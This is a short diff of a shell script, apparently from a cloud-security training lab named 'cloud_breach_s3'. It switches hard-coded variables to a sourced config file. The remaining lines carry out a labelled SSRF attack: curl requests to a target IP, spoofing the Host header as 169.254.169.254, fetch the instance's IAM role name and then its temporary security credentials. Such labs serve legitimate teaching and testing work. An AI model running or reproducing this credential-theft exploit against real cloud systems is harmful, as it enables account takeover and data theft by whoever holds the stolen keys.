@@ -1,5 +1,5 @@
-S3_BUCKET=''
-IP_ADDRESS=''
+. ./cloud_breach_s3.config
+
 echo 'ssrf attack'
 ROLE=$(curl -s http://$IP_ADDRESS/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254')
 sts_session=$(curl -s http://$IP_ADDRESS/latest/meta-data/iam/security-credentials/$ROLE -H 'Host:169.254.169.254')
